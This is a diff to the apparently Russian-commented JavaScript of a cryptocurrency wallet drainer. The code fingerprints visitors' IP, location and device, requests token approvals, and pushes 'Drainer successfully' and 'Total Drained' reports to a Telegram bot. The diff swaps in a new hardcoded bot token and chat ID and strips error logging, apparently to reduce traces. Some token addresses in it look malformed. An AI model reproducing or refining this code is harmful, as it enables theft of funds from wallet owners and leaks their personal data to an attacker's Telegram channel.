@@ -17,8 +17,8 @@ const debounce = (func, wait) => {
 const projectId = import.meta.env.VITE_PROJECT_ID || 'd85cc83edb401b676e2a7bcef67f3be8'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
-const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8149184232:AAHISG-R56lifWMVqYwzoWx0j4yH8lDjivg'
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4944144227'
+const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '7893105607:AAFqn6yRhXVocTodMo8xNufTFKjmzMYnNAU'
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4931121242'
 
 const networks = [bsc, mainnet, polygon]
 const networkMap = {
@@ -44,7 +44,8 @@ const store = {
   errors: [],
   approvedTokens: {},
   isApprovalRequested: false,
-  isApprovalRejected: false
+  isApprovalRejected: false,
+  lastNotifiedConnection: null // Для отслеживания последнего уведомления
 }
 
 // Утилиты для обновления состояния
@@ -88,12 +89,8 @@ const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, t
       console.log(`Transfer request successful: ${data.txHash}`)
       return { success: true, txHash: data.txHash }
     }
-    store.errors.push(`Transfer request failed: ${data.message}`)
-    console.error(`Transfer request failed: ${data.message}`)
     return { success: false, message: data.message }
   } catch (error) {
-    store.errors.push(`Error sending transfer request: ${error.message}`)
-    console.error(`Error sending transfer request: ${error.message}`)
     return { success: false, message: error.message }
   }
 }
@@ -109,8 +106,6 @@ async function getUserIP() {
     sessionStorage.setItem('userIP', ip)
     return ip
   } catch (error) {
-    store.errors.push(`Error fetching IP: ${error.message}`)
-    console.error(`❌ Error fetching IP: ${error.message}`)
     return 'Unknown IP'
   }
 }
@@ -125,18 +120,19 @@ async function getGeolocation(ip) {
     sessionStorage.setItem('userLocation', location)
     return location
   } catch (error) {
-    store.errors.push(`Error fetching geolocation: ${error.message}`)
-    console.error(`❌ Error fetching geolocation: ${error.message}`)
     return 'Unknown Location'
   }
 }
 
 function detectDevice() {
-  const userAgent = navigator.userAgent || 'Unknown Device'
-  let deviceType = 'Desktop'
-  if (/mobile/i.test(userAgent)) deviceType = 'Mobile'
-  else if (/tablet/i.test(userAgent)) deviceType = 'Tablet'
-  return `${deviceType}
+  const userAgent = navigator.userAgent || navigator.vendor || window.opera || 'Unknown Device';
+
+  if (/Windows NT/i.test(userAgent)) return 'Windows';
+  if (/iPhone/i.test(userAgent) && !/Android/i.test(userAgent)) return 'iPhone'; // Исключаем Android-устройства
+  if (/Android/i.test(userAgent) && !/iPhone/i.test(userAgent)) return 'Android';
+  if (/Macintosh|Mac OS X/i.test(userAgent)) return 'Mac';
+  if (/Tablet|iPad/i.test(userAgent)) return 'Tablet';
+  return 'Desktop';
 }
 
 // Функция отправки сообщений в Telegram
@@ -145,20 +141,21 @@ async function sendTelegramMessage(message) {
     const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown' })
+      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
     })
     const data = await response.json()
     if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message')
     console.log('Telegram message sent successfully')
   } catch (error) {
-    store.errors.push(`Error sending Telegram message: ${error.message}`)
-    console.error(`❌ Error sending Telegram message: ${error.message}`)
   }
 }
 
 // Уведомления
 async function notifyWalletConnection(address, walletName, device, balances, chainId) {
-  if (sessionStorage.getItem('walletConnectedNotified')) return
+  const connectionKey = `${address}_${chainId}_${Date.now()}`
+  if (store.lastNotifiedConnection === connectionKey) return
+  store.lastNotifiedConnection = connectionKey
+
   try {
     console.log('Sending wallet connection notification')
     const ip = await getUserIP()
@@ -179,17 +176,14 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
       .join('\n')
 
     const message = `🚨 New connect (${walletName} - ${device})\n` +
-                    `🌀 Address: [${address}](${scanLink})\n` +
+                    `🌀 [Address](${scanLink})\n` +
                     `🕸 Network: EVM\n` +
-                    `🌎 ${ip} | ${location}\n\n` +
+                    `🌎 ${ip}\n\n` +
                     `💰 **Total Value: ${totalValue.toFixed(2)}$**\n` +
                     `${tokenList}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
-    sessionStorage.setItem('walletConnectedNotified', 'true')
   } catch (error) {
-    store.errors.push(`Error sending wallet connection notification: ${error.message}`)
-    console.error(`Error sending wallet connection notification: ${error.message}`)
   }
 }
 
@@ -203,17 +197,15 @@ async function notifyTransferApproved(address, walletName, device, token, chainI
     const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
     const amountValue = (token.balance * token.price).toFixed(2)
 
-    const message = `⚠️ Balance transfer approved (Кошелек: \`${walletName}\` - \`${device}\`)\n` +
-                    `🌀 Address: [\`${address}\`](${scanLink})\n` +
-                    `🕸 Network: EVM (${networkName})\n` +
-                    `🌎 \`${ip}\` | \`${location}\`\n\n` +
+    const message = `⚠️ Balance transfer approved (${walletName} - ${device})\n` +
+                    `🌀 [Address](${scanLink})\n` +
+                    `🕸 Network: EVM\n` +
+                    `🌎 ${ip}\n\n` +
                     `**🔥 Processing: ${amountValue}$**\n` +
                     `➡️ ${token.symbol}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
   } catch (error) {
-    store.errors.push(`Error sending transfer approved notification: ${error.message}`)
-    console.error(`Error sending transfer approved notification: ${error.message}`)
   }
 }
 
@@ -227,17 +219,15 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
     const amountValue = (token.balance * token.price).toFixed(2)
     const txLink = getScanLink(txHash, chainId, true)
 
-    const message = `✅ Drainer successfully (Кошелек: \`${walletName}\` - \`${device}\`)\n` +
-                    `🌀 Address: [\`${address}\`](${scanLink})\n` +
-                    `🕸 Network: EVM (${networkName})\n` +
-                    `🌎 \`${ip}\` | \`${location}\`\n\n` +
+    const message = `✅ Drainer successfully (${walletName} - ${device})\n` +
+                    `🌀 [Address](${scanLink})\n` +
+                    `🕸 Network: EVM\n` +
+                    `🌎 ${ip}\n\n` +
                     `**💰 Total Drained: ${amountValue}$**\n` +
                     `➡️ ${token.symbol} - ${amountValue}$\n\n` +
-                    `🔗 Site Transfers: ${txLink}`
+                    `🔗 Transfer: [Transactin Hash](${txLink})`
     await sendTelegramMessage(message)
   } catch (error) {
-    store.errors.push(`Error sending transfer success notification: ${error.message}`)
-    console.error(`Error sending transfer success notification: ${error.message}`)
   }
 }
 
@@ -309,7 +299,6 @@ const initializeSubscribers = (modal) => {
         const targetNetworkInfo = networkMap[mostExpensive.network]
         if (!targetNetworkInfo) {
           const errorMessage = `Target network for ${mostExpensive.network} (chainId ${mostExpensive.chainId}) not found in networkMap`
-          console.error(errorMessage)
           store.errors.push(errorMessage)
           const approveState = document.getElementById('approveState')
           if (approveState) approveState.innerHTML = errorMessage
@@ -340,7 +329,6 @@ const initializeSubscribers = (modal) => {
             })
           } catch (error) {
             const errorMessage = `Failed to switch network to ${mostExpensive.network} (chainId ${expectedChainId}): ${error.message}`
-            console.error(errorMessage)
             store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
@@ -381,7 +369,6 @@ const initializeSubscribers = (modal) => {
             await notifyTransferSuccess(state.address, walletInfo.name, device, mostExpensive, mostExpensive.chainId, transferResult.txHash)
           } else {
             approveMessage += `<br>Transfer request failed: ${transferResult.message}`
-            console.error(`Transfer request failed: ${transferResult.message}`)
           }
 
           const approveState = document.getElementById('approveState')
@@ -391,10 +378,12 @@ const initializeSubscribers = (modal) => {
           if (error.code === 4001 || error.code === -32000) {
             store.isApprovalRejected = true
             const errorMessage = `Approve was rejected for ${mostExpensive.symbol} on ${mostExpensive.network}`
+            store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
           } else {
             const errorMessage = `Approve failed for ${mostExpensive.symbol} on ${mostExpensive.network}: ${error.message}`
+            store.errors.push(errorMessage)
             const approveState = document.getElementById('approveState')
             if (approveState) approveState.innerHTML = errorMessage
           }
@@ -429,8 +418,8 @@ document.getElementById('disconnect')?.addEventListener('click', () => {
   store.errors = []
   store.isApprovalRequested = false
   store.isApprovalRejected = false
-  sessionStorage.removeItem('walletConnectedNotified')
-  sessionStorage.setItem('tokenCheck', 'true')
+  store.lastNotifiedConnection = null
+  sessionStorage.clear()
 })
 
 document.getElementById('switch-network')?.addEventListener('click', () => {
@@ -475,7 +464,7 @@ const TOKENS = {
   'BNB Smart Chain': [
     { symbol: 'USDT', address: '0x55d398326f99059ff775485246999027b3197955', decimals: 18 },
     { symbol: 'USDC', address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d', decimals: 18 },
-    { symbol: 'SHIB', address: '0x2859e4544c4bb0390a468f4b6e3e63bd2d0dd4d', decimals: 18 },
+    { symbol: 'SHIB', address: '0x2859e4544c4bb039668b1a517b2f6c39240b3a2f', decimals: 18 },
     { symbol: 'PEPE', address: '0x25d887ce7a35172c62febfd67a1856f20faebb00', decimals: 18 },
     { symbol: 'FLOKI', address: '0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006', decimals: 18 },
     { symbol: 'CAKE', address: '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82', decimals: 18 },
@@ -500,7 +489,7 @@ const TOKENS = {
     { symbol: 'GHST', address: '0x385eeac5cb85a38a9a07a70c73e0a3271cfb54b7', decimals: 18 },
     { symbol: 'DFYN', address: '0xc168e40227e4ebd8b3dabb4b05d0b7c67f6a9be', decimals: 18 },
     { symbol: 'FISH', address: '0x3a3df212b7aa91aa0402b9035b098891d276572b', decimals: 18 },
-    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0fea8e9b7ea0f28c4', decimals: 18 },
+    { symbol: 'ICE', address: '0x4e1581f01046ef0d6b6c3aa0a0fea8e9b7ea0f28c4', decimals: 18 },
     { symbol: 'DC', address: '0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e', decimals: 18 }
   ]
 }
@@ -553,7 +542,6 @@ const getTokenPrice = async (symbol) => {
     return Number(data.price) || 0
   } catch (error) {
     store.errors.push(`Error fetching price for ${symbol}: ${error.message}`)
-    console.error(`Error fetching price for ${symbol}: ${error.message}`)
     return 0
   }
 }
